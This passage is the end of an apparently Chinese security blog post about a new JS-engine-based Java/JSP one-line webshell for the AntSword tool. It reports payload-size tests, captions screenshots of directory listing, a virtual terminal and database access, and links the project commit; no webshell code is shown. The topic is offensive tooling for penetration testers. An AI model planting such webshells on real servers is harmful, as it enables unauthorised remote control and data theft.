+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121869548-0359a60d-9ba2-4e04-880e-8c216374baed.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。</p>
+<h2 id="测试" class="headerLink">
+    <a href="#%e6%b5%8b%e8%af%95" class="header-mark"></a>7 测试</h2><p>测试环境：Java&gt;=6</p>
+<p>同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122101963-98b2efc3-85ac-4ec9-b653-6c353cc121eb.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122112355-e2d1a139-3ba3-481b-b73e-58aa8b1e49d3.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>列目录</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122017384-2c0da9c3-b0ef-4cfe-8ac4-aa8cd0b39732.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>中文测试</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623121998569-7a3c990d-a9ed-4bc4-bd71-474cbc35466a.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>虚拟终端</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122045799-5feddd0e-a401-4ee0-ae9c-f43a87542256.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>数据库连接</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623122226891-a85b9d65-a470-49ea-b73a-0c5a7e73b8f7.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>8 最后</h2><p>基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。</p>
+<p>提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。</p>
+<p>项目地址：</p>
+<p><a href="https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385" target="_blank" rel="noopener noreferrer">https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385</a></p>
+<h3 id="heading" class="headerLink">
+    <a href="#heading" class="header-mark"></a>8.1 </h3><h3 id="heading-1" class="headerLink">
+    <a href="#heading-1" class="header-mark"></a>8.2 </h3></div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-06-19</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/a-new-type-java-webshell/" data-title="一种新型Java一句话木马的实现"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/a-new-type-java-webshell/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/a-new-type-java-webshell/" data-title="一种新型Java一句话木马的实现"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/a-new-type-java-webshell/" data-title="一种新型Java一句话木马的实现"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/a-new-type-java-webshell/" data-title="一种新型Java一句话木马的实现"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/a-new-type-java-webshell/" data-title="一种新型Java一句话木马的实现" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;一种新型Java一句话木马的实现&#34;, &#34;https://yzddmr6.com/posts/a-new-type-java-webshell/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/as-exploits-v13-update/" class="prev" rel="prev" title="As-Exploits v1.3更新"><i class="fas fa-angle-left fa-fw"></i>As-Exploits v1.3更新</a>
+            <a href="/posts/as-exploits-v14-update/" class="next" rel="next" title="As-Exploits v1.4更新">As-Exploits v1.4更新<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
